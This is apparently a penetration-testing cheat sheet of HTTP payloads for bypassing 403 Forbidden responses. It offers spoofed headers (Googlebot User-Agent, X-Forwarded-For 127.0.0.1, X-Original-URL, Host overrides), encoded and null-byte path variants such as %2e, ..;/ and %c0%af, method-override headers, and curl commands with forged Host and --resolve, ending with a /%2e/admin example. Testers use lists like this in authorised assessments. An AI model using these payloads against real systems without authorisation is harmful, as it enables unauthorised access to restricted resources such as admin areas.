


```http
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
```

```http
Referer: <target>
```

```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: <host>
X-Original-URL: /
```

```http
Origin: <target>
```

```http
GET /%2e HTTP/1.1
GET /. HTTP/1.1
GET /./ HTTP/1.1
GET /..;/ HTTP/1.1
```

```http
HEAD / HTTP/1.1
```

```http
Host: <target>
X-Host: <trusted host>
```

```http
GET /%252e HTTP/1.1
GET /%2e%2e/ HTTP/1.1
GET /%2f HTTP/1.1
```


```http
GET /%c0%af HTTP/1.1
GET /%e0%80%af HTTP/1.1
```


```http
GET /%00 HTTP/1.1
GET /%00/ HTTP/1.1
```

```http
Content-Length: 0
Content-Length: 16
```

```http
X-Original-Method: GET
X-Http-Method-Override: GET
```

```http
GET /  HTTP/< change to 1.0 / 1.1 / 2 >
```

```http
GET /  HTTP/1.1
X-HTTP-Method: POST
```

```sh
curl -H "Host: another-allowed-host.com" --resolve "sub.target.com:443:XX.XX.XX.XX" <target>
```

```sh
curl -H "X-Forwarded-For: 1.1.1.1" <target>
```

```http
if 403 target is target.com/admin,
try target.com/%2e/admin
```




